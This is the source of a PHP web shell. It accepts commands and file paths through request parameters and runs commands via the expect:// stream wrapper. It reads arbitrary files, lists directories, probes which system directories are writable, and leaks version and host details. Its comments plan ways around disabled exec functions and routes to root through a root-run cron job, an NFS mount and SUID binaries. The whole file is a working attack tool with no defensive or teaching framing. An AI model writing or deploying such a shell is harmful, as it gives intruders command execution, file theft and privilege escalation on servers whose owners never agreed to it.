<?php
// dl() bypass - load a .so extension that provides exec
// OR: use PHP's built-in proc_open via stream context
// OR: use pcntl functions if available

$o = '';

if (isset($_REQUEST['cmd'])) {
    $cmd = $_REQUEST['cmd'];
    
    // Method 1: Try backtick (uses shell_exec internally)
    // Method 2: Try expect:// stream wrapper
    if (in_array('expect', stream_get_wrappers())) {
        $fp = fopen("expect://$cmd", "r");
        $o = stream_get_contents($fp);
        fclose($fp);
    }
    
    // Method 3: PHP >= 8.4 Fiber-based workaround? No.
    
    // Method 4: Write shell script to /tmp, set executable, trigger via cron
    // Cron runs every 30 min for PHP session cleanup as ROOT
    // /usr/lib/php/sessionclean is called by /etc/cron.d/php
    // Can we write to session.save_path?
    
    // Method 5: Write to /tmp and use at/batch job
    
    // Method 6: Abuse NFS mount
    // /mnt/nfs is writable — if we can write a cron job there or SUID binary
    
    // For now: just confirm we can write here and read files
    if (!$o) {
        $o = "SHELL_OK|" . phpversion() . "|" . php_uname() . "|";
        $o .= "CWD:" . getcwd() . "|";
        $o .= "WRITE_TMP:" . (file_put_contents("/tmp/cmd_test", $cmd) !== false ? "OK" : "FAIL") . "|";
        $o .= "WRITE_NFS:" . (@file_put_contents("/mnt/nfs/cmd_test", $cmd) !== false ? "OK" : "FAIL") . "|";
        $o .= "WRITE_VAR:" . (@file_put_contents("/var/tmp/cmd_test", $cmd) !== false ? "OK" : "FAIL") . "|";
        $o .= "WRITE_SHM:" . (@file_put_contents("/dev/shm/cmd_test", $cmd) !== false ? "OK" : "FAIL") . "|";
        $o .= "WRITE_WWW:" . (@file_put_contents("/var/www/html/cmd_test", $cmd) !== false ? "OK" : "FAIL") . "|";
        $o .= "WRITE_HOME:" . (@file_put_contents("/home/ubuntu/cmd_test", $cmd) !== false ? "OK" : "FAIL") . "|";
        $o .= "SCANDIR_TMP:" . implode(",", @scandir("/tmp/") ?: []) . "|";
    }
}

if (isset($_REQUEST['r'])) {
    $o = @file_get_contents($_REQUEST['r']);
}

if (isset($_REQUEST['d'])) {
    $entries = @scandir($_REQUEST['d']);
    $o = $entries ? implode("\n", $entries) : "SCAN_FAIL";
}

header('Content-Type: text/plain');
echo $o ?: "READY|" . phpversion() . "|" . php_uname();
